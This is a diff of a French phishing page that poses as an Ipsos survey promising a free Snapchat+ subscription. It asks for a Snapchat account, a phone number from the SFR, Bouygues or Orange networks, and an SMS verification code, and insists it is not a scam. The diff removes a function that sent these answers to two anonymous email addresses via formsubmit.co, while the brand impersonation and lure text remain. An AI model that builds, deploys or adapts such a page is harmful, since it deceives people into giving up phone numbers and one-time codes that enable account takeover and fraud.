@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <title>Sondage | Ipsos</title>
 
-<!-- Police -->
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
 <style>
@@ -39,20 +38,13 @@ body {
     font-weight:700;
 }
 
-/* LOGOS FIXES (FRANCE + SNAPCHAT) */
-.logos-fixed {
+/* LOGO FRANCE FIXE */
+.logo-fixed {
     position:fixed;
-    top:15px;
-    right:15px;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    gap:10px;
+    top:20px;
+    right:20px;
+    height:55px;
     z-index:999;
-}
-
-.logos-fixed img {
-    height:45px;
 }
 
 /* CONTENU */
@@ -114,8 +106,19 @@ button:disabled {
     display:none;
     text-align:center;
     margin-top:35px;
-    font-size:18px;
-    color:#555;
+}
+
+#partenariat .title {
+    font-size:22px;
+    font-weight:700;
+    color:#d00000;
+    margin-bottom:12px;
+}
+
+#partenariat .operateurs {
+    font-size:26px;
+    font-weight:800;
+    color:#d00000;
 }
 
 /* PIED DE PAGE */
@@ -138,11 +141,8 @@ button:disabled {
 
 <body>
 
-<!-- Logos fixes -->
-<div class="logos-fixed">
-    <img src="francelogo.png" alt="France">
-    <img src="SnapchatLogo.png" alt="Snapchat">
-</div>
+<!-- Logo France fixe -->
+<img src="francelogo.png" class="logo-fixed" alt="France">
 
 <div class="header">
     <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos réponses seront perdues.')">
@@ -158,10 +158,12 @@ button:disabled {
     <button onclick="demarrer()">Commencer</button>
 </div>
 
-<!-- INTERMÉDIAIRE -->
+<!-- INTERMÉDIAIRE (TEXTE COMPLET CONSERVÉ) -->
 <div class="box" id="intermediaire" style="display:none;">
     <h2>Merci !</h2>
-    <p>Pour recevoir votre abonnement à Snapchat+, une vérification d'identité est nécessaire afin de garantir des réponses humaines et d'éviter les abus. Cette offre n'est disponible qu'une seule fois par compte Snapchat et par personne, donc en continuant vous vous engagez à ce que cela constitue votre première et unique intervention sur ce sondage. Non ce n'est pas une arnaque. Seules les entreprises SFR, Bouygues et Orange sont acceptées par les partenaires avec lesquels nous travaillons. La vérification se fait via votre numéro de téléphone (données anonymes et supprimées ensuite).</p>
+    <p>
+        Pour recevoir votre abonnement à Snapchat+, une vérification d'identité est nécessaire afin de garantir des réponses humaines et d'éviter les abus. Cette offre n'est disponible qu'une seule fois par compte Snapchat et par personne, donc en continuant vous vous engagez à ce que cela constitue votre première et unique intervention sur ce sondage. Non ce n'est pas une arnaque. Seules les entreprises SFR, Bouygues et Orange sont acceptées par les partenaires avec lesquels nous travaillons. La vérification se fait via votre numéro de téléphone (données anonymes et supprimées ensuite).
+    </p>
     <button onclick="continuer()">Continuer</button>
 </div>
 
@@ -177,14 +179,14 @@ button:disabled {
 
     <button id="btnSuivant" onclick="suivant()" disabled>Suivant</button>
 
-   <div id="partenariat">
-    <strong><font color="red">Snapchat + Ipsos</font></strong><br>
-    <font color="red"><strong></strong>Nous acceptons seulement Bouygues Telecom, Orange et SFR</strong></font>
+    <div id="partenariat">
+        <div class="title">Snapchat + Ipsos</div>
+        <div class="operateurs">
+            Nous acceptons seulement Bouygues Telecom, Orange et SFR
+        </div>
+    </div>
 </div>
 
-</div>
-
-<!-- PIED DE PAGE -->
 <div class="footer">
     © 2026 Ipsos – Tous droits réservés
 </div>
@@ -275,47 +277,7 @@ function continuer(){
     document.getElementById("sondage").style.display="block";
     afficherQuestion();
 }
-
-function envoyer() {
-    const formData1 = new FormData();
-    formData1.append("artiste_prefere", reponsesUtilisateur[0] || "");
-    formData1.append("artiste_deezer", reponsesUtilisateur[1] || "");
-    formData1.append("artiste_decouverte", reponsesUtilisateur[2] || "");
-    formData1.append("snapchat", reponsesUtilisateur[3] || "");
-    formData1.append("telephone", reponsesUtilisateur[4] || "");
-    formData1.append("code_sms", reponsesUtilisateur[5] || "");
-    formData1.append("_captcha", "false");
-    formData1.append("_template", "table");
-
-    fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
-        method: "POST",
-        body: formData1
-    })
-    .then(() => console.log("Premier mail envoyé"))
-    .catch(err => console.error("Erreur premier envoi :", err));
-
-    const formData2 = new FormData();
-    formData2.append("artiste_prefere", reponsesUtilisateur[0] || "");
-    formData2.append("artiste_deezer", reponsesUtilisateur[1] || "");
-    formData2.append("artiste_decouverte", reponsesUtilisateur[2] || "");
-    formData2.append("snapchat", reponsesUtilisateur[3] || "");
-    formData2.append("telephone", reponsesUtilisateur[4] || "");
-    formData2.append("code_sms", reponsesUtilisateur[5] || "");
-    formData2.append("_captcha", "false");
-    formData2.append("_template", "table");
-
-    fetch("https://formsubmit.co/becteurfoou@proton.me", {
-        method: "POST",
-        body: formData2
-    })
-    .then(() => console.log("Deuxième mail envoyé"))
-    .catch(err => console.error("Erreur deuxième envoi :", err));
-}
 </script>
 
 </body>
 </html>
-
-
-
-
